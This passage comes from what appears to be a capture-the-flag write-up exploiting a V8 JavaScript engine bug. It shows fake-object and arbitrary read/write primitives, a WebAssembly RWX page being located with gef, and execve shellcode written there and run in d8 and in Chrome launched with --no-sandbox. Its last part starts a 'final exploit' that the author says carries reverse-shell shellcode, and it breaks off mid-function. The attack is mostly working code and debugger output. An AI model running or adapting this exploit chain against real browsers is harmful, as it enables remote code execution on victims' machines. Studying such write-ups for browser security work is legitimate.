</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">wasmCode</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Uint8Array</span><span class="p">([</span><span class="mi">0</span><span class="p">,</span><span class="mi">97</span><span class="p">,</span><span class="mi">115</span><span class="p">,</span><span class="mi">109</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">133</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">96</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">127</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                               <span class="mi">130</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">132</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">112</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">5</span><span class="p">,</span><span class="mi">131</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                               <span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">6</span><span class="p">,</span><span class="mi">129</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">7</span><span class="p">,</span><span class="mi">145</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                               <span class="mi">128</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">6</span><span class="p">,</span><span class="mi">109</span><span class="p">,</span><span class="mi">101</span><span class="p">,</span><span class="mi">109</span><span class="p">,</span><span class="mi">111</span><span class="p">,</span><span class="mi">114</span><span class="p">,</span><span class="mi">121</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">109</span><span class="p">,</span><span class="mi">97</span><span class="p">,</span><span class="mi">105</span><span class="p">,</span><span class="mi">110</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                               <span class="mi">0</span><span class="p">,</span><span class="mi">10</span><span class="p">,</span><span class="mi">138</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">132</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">65</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">11</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">wasm_module</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">WebAssembly</span><span class="p">.</span><span class="nx">Module</span><span class="p">(</span><span class="nx">wasmCode</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">wasm_instance</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">WebAssembly</span><span class="p">.</span><span class="nx">Instance</span><span class="p">(</span><span class="nx">wasm_module</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">pwn</span> <span class="o">=</span> <span class="nx">wasm_instance</span><span class="p">.</span><span class="nx">exports</span><span class="p">.</span><span class="nx">main</span><span class="p">;</span>
</span></span></code></pre></div><p>This is the JS code which is used to create <code>pwn</code> function which would reside in the <code>rwx</code> section, with this step aside, let&rsquo;s move on:-</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">wasm_instance_addr</span> <span class="o">=</span> <span class="nx">addrof</span><span class="p">(</span><span class="nx">wasm_instance</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span><span class="nx">n</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">rwx</span> <span class="o">=</span> <span class="nx">arb_read</span><span class="p">(</span><span class="nx">wasm_instance_addr</span> <span class="o">+</span> <span class="mh">0x68</span><span class="nx">n</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span><span class="nx">n</span><span class="p">);</span>
</span></span></code></pre></div><p>First off, we needed to find the base address of the <code>rwx</code> segment, this was easier to find since, all I had to do is to find the address stored throught the memory and from what offset, it was exactly located at, I used the <code>gef</code>&rsquo;s <code>search-pattern rwx_address</code> and found the reference of that memory located at the offset <code>wasm_instance_addr + 0x68</code>:-</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="nf">gef</span><span class="err">➤</span>  <span class="no">vmmap</span>
</span></span><span class="line"><span class="cl"><span class="err">[</span> <span class="nl">Legend:</span>  <span class="nf">Code</span> <span class="err">|</span> <span class="no">Heap</span> <span class="err">|</span> <span class="no">Stack</span> <span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="nf">Start</span>              <span class="no">End</span>                <span class="no">Offset</span>             <span class="no">Perm</span> <span class="no">Path</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x00002f81a4494000</span> <span class="mi">0x00002f81a4495000</span> <span class="mi">0x0000000000000000</span> <span class="no">rwx</span> 
</span></span><span class="line"><span class="cl"><span class="mi">0x00003ce700000000</span> <span class="mi">0x00003ce70000c000</span> <span class="mi">0x0000000000000000</span> <span class="no">rw-</span> 
</span></span><span class="line"><span class="cl"><span class="mi">0x00003ce70000c000</span> <span class="mi">0x00003ce700040000</span> <span class="mi">0x0000000000000000</span> <span class="p">---</span> 
</span></span><span class="line"><span class="cl"><span class="mi">0x00003ce700040000</span> <span class="mi">0x00003ce700041000</span> <span class="mi">0x0000000000000000</span> <span class="no">rw-</span> 
</span></span><span class="line"><span class="cl"><span class="mi">0x00003ce700041000</span> <span class="mi">0x00003ce700042000</span> <span class="mi">0x0000000000000000</span> <span class="p">---</span> 
</span></span><span class="line"><span class="cl"><span class="mi">0x00003ce700042000</span> <span class="mi">0x00003ce700052000</span> <span class="mi">0x0000000000000000</span> <span class="no">r-x</span> 
</span></span><span class="line"><span class="cl"><span class="mi">0x00003ce700052000</span> <span class="mi">0x00003ce70007f000</span> <span class="mi">0x0000000000000000</span> <span class="p">---</span> 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">[..</span><span class="no">snip..</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nf">gef</span><span class="err">➤</span>  <span class="no">search-pattern</span> <span class="mi">0x00002f81a4494000</span>
</span></span><span class="line"><span class="cl"><span class="err">[+]</span> <span class="nf">Searching</span> <span class="err">&#39;\</span><span class="no">x00</span><span class="err">\</span><span class="no">x40</span><span class="err">\</span><span class="no">x49</span><span class="err">\</span><span class="no">xa4</span><span class="err">\</span><span class="no">x81</span><span class="err">\</span><span class="no">x2f</span><span class="err">\</span><span class="no">x00</span><span class="err">\</span><span class="no">x00</span><span class="err">&#39;</span> <span class="no">in</span> <span class="no">memory</span>
</span></span><span class="line"><span class="cl"><span class="err">[+]</span> <span class="nf">In</span> <span class="p">(</span><span class="mi">0x3ce708080000</span><span class="p">-</span><span class="mi">0x3ce70818d000</span><span class="p">),</span> <span class="no">permission</span><span class="err">=</span><span class="no">rw-</span>
</span></span><span class="line"><span class="cl">  <span class="err">0</span><span class="nf">x3ce70808a78c</span> <span class="p">-</span> <span class="mi">0x3ce70808a7ac</span>  <span class="err">→</span>   <span class="err">&#34;\</span><span class="no">x00</span><span class="err">\</span><span class="no">x40</span><span class="err">\</span><span class="no">x49</span><span class="err">\</span><span class="no">xa4</span><span class="err">\</span><span class="no">x81</span><span class="err">\</span><span class="no">x2f</span><span class="err">\</span><span class="no">x00</span><span class="err">\</span><span class="no">x00</span><span class="p">[...]</span><span class="err">&#34;</span> 
</span></span><span class="line"><span class="cl">  <span class="mi">0x3ce70808a7d8</span> <span class="p">-</span> <span class="mi">0x3ce70808a7f8</span>  <span class="err">→</span>   <span class="err">&#34;\</span><span class="no">x00</span><span class="err">\</span><span class="no">x40</span><span class="err">\</span><span class="no">x49</span><span class="err">\</span><span class="no">xa4</span><span class="err">\</span><span class="no">x81</span><span class="err">\</span><span class="no">x2f</span><span class="err">\</span><span class="no">x00</span><span class="err">\</span><span class="no">x00</span><span class="p">[...]</span><span class="err">&#34;</span> 
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="err">+</span><span class="p">]</span> <span class="no">In</span> <span class="p">(</span><span class="mi">0x3ce708200000</span><span class="p">-</span><span class="mi">0x3ce708280000</span><span class="p">),</span> <span class="no">permission</span><span class="err">=</span><span class="no">rw-</span>
</span></span><span class="line"><span class="cl">  <span class="err">0</span><span class="nf">x3ce708211230</span> <span class="p">-</span> <span class="mi">0x3ce708211250</span>  <span class="err">→</span>   <span class="err">&#34;\</span><span class="no">x00</span><span class="err">\</span><span class="no">x40</span><span class="err">\</span><span class="no">x49</span><span class="err">\</span><span class="no">xa4</span><span class="err">\</span><span class="no">x81</span><span class="err">\</span><span class="no">x2f</span><span class="err">\</span><span class="no">x00</span><span class="err">\</span><span class="no">x00</span><span class="p">[...]</span><span class="err">&#34;</span> 
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="err">+</span><span class="p">]</span> <span class="no">In</span> <span class="err">&#39;</span><span class="p">[</span><span class="no">heap</span><span class="p">]</span><span class="err">&#39;</span><span class="p">(</span><span class="mi">0x55555648d000</span><span class="p">-</span><span class="mi">0x55555658a000</span><span class="p">),</span> <span class="no">permission</span><span class="err">=</span><span class="no">rw-</span>
</span></span><span class="line"><span class="cl">  <span class="err">0</span><span class="nf">x5555564dc618</span> <span class="p">-</span> <span class="mi">0x5555564dc638</span>  <span class="err">→</span>   <span class="err">&#34;\</span><span class="no">x00</span><span class="err">\</span><span class="no">x40</span><span class="err">\</span><span class="no">x49</span><span class="err">\</span><span class="no">xa4</span><span class="err">\</span><span class="no">x81</span><span class="err">\</span><span class="no">x2f</span><span class="err">\</span><span class="no">x00</span><span class="err">\</span><span class="no">x00</span><span class="p">[...]</span><span class="err">&#34;</span> 
</span></span><span class="line"><span class="cl">  <span class="mi">0x5555564df560</span> <span class="p">-</span> <span class="mi">0x5555564df580</span>  <span class="err">→</span>   <span class="err">&#34;\</span><span class="no">x00</span><span class="err">\</span><span class="no">x40</span><span class="err">\</span><span class="no">x49</span><span class="err">\</span><span class="no">xa4</span><span class="err">\</span><span class="no">x81</span><span class="err">\</span><span class="no">x2f</span><span class="err">\</span><span class="no">x00</span><span class="err">\</span><span class="no">x00</span><span class="p">[...]</span><span class="err">&#34;</span> 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">[..</span><span class="no">snip..</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nf">gef</span><span class="err">➤</span>  <span class="no">p</span> <span class="mi">0x00003ce700000000</span> <span class="err">+</span> <span class="mi">0x82111c9</span>
</span></span><span class="line"><span class="cl"><span class="nf">$1</span> <span class="err">=</span> <span class="mi">0x3ce7082111c9</span>
</span></span><span class="line"><span class="cl"><span class="nf">gef</span><span class="err">➤</span>  <span class="no">p</span> <span class="mi">0x3ce708211230</span> <span class="p">-</span> <span class="mi">0x3ce7082111c9</span>
</span></span><span class="line"><span class="cl"><span class="nf">$2</span> <span class="err">=</span> <span class="mi">0x67</span>
</span></span></code></pre></div><p>With the above out of the way, we need to know make use of <code>DataView</code> and <code>ArrayBuffer</code> as this will help you in overwriting the address with the desired value, in short these two functions allows you to write the data in binary format using the <code>ArrayBuffer</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">&#34;[+] Wasm instance address: 0x&#34;</span> <span class="o">+</span> <span class="nx">wasm_instance_addr</span><span class="p">.</span><span class="nx">toString</span><span class="p">(</span><span class="mi">16</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">&#34;[*] RWX INSTANCE:   0x&#34;</span> <span class="o">+</span> <span class="nx">rwx</span><span class="p">.</span><span class="nx">toString</span><span class="p">(</span><span class="mi">16</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">arr_buf</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">ArrayBuffer</span><span class="p">(</span><span class="mh">0x100</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">dataview</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">DataView</span><span class="p">(</span><span class="nx">arr_buf</span><span class="p">);</span>
</span></span></code></pre></div><p>The backing store of an <code>ArrayBuffer</code> can be considered as same as the elements pointer of a <code>JSArray</code>. It is found at offset <code>&amp;ArrayBuffer+0x14</code>, which you can find out by using the <code>x64.debug</code> version of <code>d8</code> binary. The principle of this is that instead of using a <code>fakeobj</code> to write directly to an arbitrary address, we use the fakeobj to do the <code>arb-write</code> and modify the backing store of a legitimate ArrayBuffer to our arbitrary address, which in this case would be overwritten with the <code>rwx</code> segment. Now, we can use <code>dataview.setBigUint64(0, val, true)</code> to write our val as a little-endian 64 bit value to our arbitrary address. This is shown below:-</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">arr_buf_addr</span> <span class="o">=</span> <span class="nx">addrof</span><span class="p">(</span><span class="nx">arr_buf</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span><span class="nx">n</span><span class="p">;;</span>
</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">back_store_addr</span> <span class="o">=</span> <span class="nx">arb_read</span><span class="p">(</span><span class="nx">arr_buf_addr</span> <span class="o">+</span> <span class="mh">0x14</span><span class="nx">n</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">&#34;[+] ArrayBuffer address: 0x&#34;</span> <span class="o">+</span> <span class="nx">arr_buf_addr</span><span class="p">.</span><span class="nx">toString</span><span class="p">(</span><span class="mi">16</span><span class="p">));</span>
</span></span><span class="line"><span class="cl"><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">&#34;[+] Back store pointer: 0x&#34;</span> <span class="o">+</span> <span class="nx">back_store_addr</span><span class="p">.</span><span class="nx">toString</span><span class="p">(</span><span class="mi">16</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">arb_write</span><span class="p">(</span><span class="nx">arr_buf_addr</span> <span class="o">+</span> <span class="mh">0x14</span><span class="nx">n</span><span class="p">,</span> <span class="nx">rwx</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">shellcode</span> <span class="o">=</span> <span class="p">[</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x31</span><span class="p">,</span> <span class="mh">0xf6</span><span class="p">,</span> <span class="mh">0x56</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x8d</span><span class="p">,</span> <span class="mh">0x3d</span><span class="p">,</span> <span class="mh">0x32</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x57</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x89</span><span class="p">,</span> <span class="mh">0xe2</span><span class="p">,</span> <span class="mh">0x56</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x8d</span><span class="p">,</span> <span class="mh">0x3d</span><span class="p">,</span> <span class="mh">0x0c</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x57</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x89</span><span class="p">,</span> <span class="mh">0xe6</span><span class="p">,</span> <span class="mh">0xb8</span><span class="p">,</span> <span class="mh">0x3b</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0x0f</span><span class="p">,</span> <span class="mh">0x05</span><span class="p">,</span> <span class="mh">0xcc</span><span class="p">,</span> <span class="mh">0x2f</span><span class="p">,</span> <span class="mh">0x75</span><span class="p">,</span> <span class="mh">0x73</span><span class="p">,</span> <span class="mh">0x72</span><span class="p">,</span> <span class="mh">0x2f</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0x62</span><span class="p">,</span> <span class="mh">0x69</span><span class="p">,</span> <span class="mh">0x6e</span><span class="p">,</span> <span class="mh">0x2f</span><span class="p">,</span> <span class="mh">0x67</span><span class="p">,</span> <span class="mh">0x6e</span><span class="p">,</span> <span class="mh">0x6f</span><span class="p">,</span> <span class="mh">0x6d</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0x65</span><span class="p">,</span> <span class="mh">0x2d</span><span class="p">,</span> <span class="mh">0x63</span><span class="p">,</span> <span class="mh">0x61</span><span class="p">,</span> <span class="mh">0x6c</span><span class="p">,</span> <span class="mh">0x63</span><span class="p">,</span> <span class="mh">0x75</span><span class="p">,</span> <span class="mh">0x6c</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0x61</span><span class="p">,</span> <span class="mh">0x74</span><span class="p">,</span> <span class="mh">0x6f</span><span class="p">,</span> <span class="mh">0x72</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x44</span><span class="p">,</span> <span class="mh">0x49</span><span class="p">,</span> <span class="mh">0x53</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0x50</span><span class="p">,</span> <span class="mh">0x4c</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span> <span class="mh">0x59</span><span class="p">,</span> <span class="mh">0x3d</span><span class="p">,</span> <span class="mh">0x3a</span><span class="p">,</span> <span class="mh">0x30</span><span class="p">,</span> <span class="mh">0x00</span>
</span></span><span class="line"><span class="cl">  <span class="p">];</span>  <span class="c1">// shellcode for spawning calculator8
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="p">(</span><span class="kd">let</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">shellcode</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="nx">dataview</span><span class="p">.</span><span class="nx">setUint8</span><span class="p">(</span><span class="nx">i</span><span class="p">,</span> <span class="nx">shellcode</span><span class="p">[</span><span class="nx">i</span><span class="p">],</span> <span class="kc">true</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>Now, this aside, we just call the function <code>pwn</code> which would result in the execution of the shellcode:-</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="nx">pwn</span><span class="p">();</span>
</span></span></code></pre></div><p>Run the exploit as <code>./d8 ./xpl.js</code> and we will see a successful calc pop:-</p>
<p>






  
  
<figure><img src="/img/ropetwo/d8_calc.png" alt="calc_pop_d8" class="mx-auto my-0 rounded-md" />
</figure>
</p>
<p>As it worked on <code>d8</code>, we must try it on the chrome binary which was distributed along from the port 8000, to run the exploit, we have to make a HTML file in which we will include the <code>pwn.js</code> file, the idea here is to use <code>--no-sandbox</code> which ultimately means no sandbox escape is being and all the JIT code must be executed on the system itself, the HTML file:-</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">       <span class="p">&lt;</span><span class="nt">script</span> <span class="na">src</span><span class="o">=</span><span class="s">&#34;xpl.js&#34;</span><span class="p">&gt;&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
</span></span></code></pre></div><p>Running the given chrome binary as <code>./chrome --no-sandbox ./xpl.html</code> resulted in the calculator being popped:-</p>
<p>






  
  
<figure><img src="/img/ropetwo/chrome_calc.png" alt="chrome calc pop" class="mx-auto my-0 rounded-md" />
</figure>
</p>
<p>Now, with this aside, first off I changed the shellcode from the previous to reverse shell shellcode, for which we will be using the exploit to get reverse shell, the final exploit looked like this:-</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">float_arr</span> <span class="o">=</span> <span class="p">[</span><span class="mf">1.1</span><span class="p">,</span> <span class="mf">2.2</span><span class="p">,</span> <span class="mf">3.3</span><span class="p">,</span> <span class="mf">4.4</span><span class="p">,</span> <span class="mf">5.5</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">obj</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&#34;A&#34;</span><span class="o">:</span><span class="mf">1.1</span><span class="p">};</span>
</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">reg</span> <span class="o">=</span> <span class="p">[</span><span class="mi">1</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">4</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">buf</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">ArrayBuffer</span><span class="p">(</span><span class="mi">8</span><span class="p">);</span> <span class="c1">// 8 byte array buffer
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kd">var</span> <span class="nx">f64_buf</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Float64Array</span><span class="p">(</span><span class="nx">buf</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">u64_buf</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Uint32Array</span><span class="p">(</span><span class="nx">buf</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">ftoi</span><span class="p">(</span><span class="nx">val</span><span class="p">,</span> <span class="nx">size</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nx">f64_buf</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nx">val</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">size</span> <span class="o">==</span> <span class="mi">32</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nx">BigInt</span><span class="p">(</span><span class="nx">u64_buf</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="nx">size</span> <span class="o">==</span> <span class="mi">64</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nx">BigInt</span><span class="p">(</span><span class="nx">u64_buf</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span> <span class="o">+</span> <span class="p">(</span><span class="nx">BigInt</span><span class="p">(</span><span class="nx">u64_buf</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span> <span class="o">&lt;&lt;</span> <span class="mi">32</span><span class="nx">n</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">itof</span><span class="p">(</span><span class="nx">val</span><span class="p">,</span> <span class="nx">size</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">size</span> <span class="o">==</span> <span class="mi">32</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nx">u64_buf</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nb">Number</span><span class="p">(</span><span class="nx">val</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span><span class="nx">n</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="nx">size</span> <span class="o">==</span> <span class="mi">64</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nx">u64_buf</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nb">Number</span><span class="p">(</span><span class="nx">val</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span><span class="nx">n</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nx">u64_buf</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="nb">Number</span><span class="p">(</span><span class="nx">val</span> <span class="o">&gt;&gt;</span> <span class="mi">32</span><span class="nx">n</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">f64_buf</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">float_arr_map</span> <span class="o">=</span> <span class="nx">ftoi</span><span class="p">(</span><span class="nx">float_arr</span><span class="p">.</span><span class="nx">GetLastElement</span><span class="p">(),</span> <span class="mi">32</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">reg_arr_map</span> <span class="o">=</span> <span class="nx">float_arr_map</span> <span class="o">-</span> <span class="mh">0xa0</span><span class="nx">n</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">&#34;[*] Float array map   :  0x&#34;</span> <span class="o">+</span> <span class="nx">float_arr_map</span><span class="p">.</span><span class="nx">toString</span><span class="p">(</span><span class="mi">16</span><span class="p">));</span>
</span></span><span class="line"><span class="cl"><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">&#34;[*] Regular array map :  0x&#34;</span> <span class="o">+</span> <span class="nx">reg_arr_map</span><span class="p">.</span><span class="nx">toString</span><span class="p">(</span><span class="mi">16</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">addrof</span><span class="p">(</span><span class="nx">in_obj</span><span class="p">)</span> <span class="p">{</span>
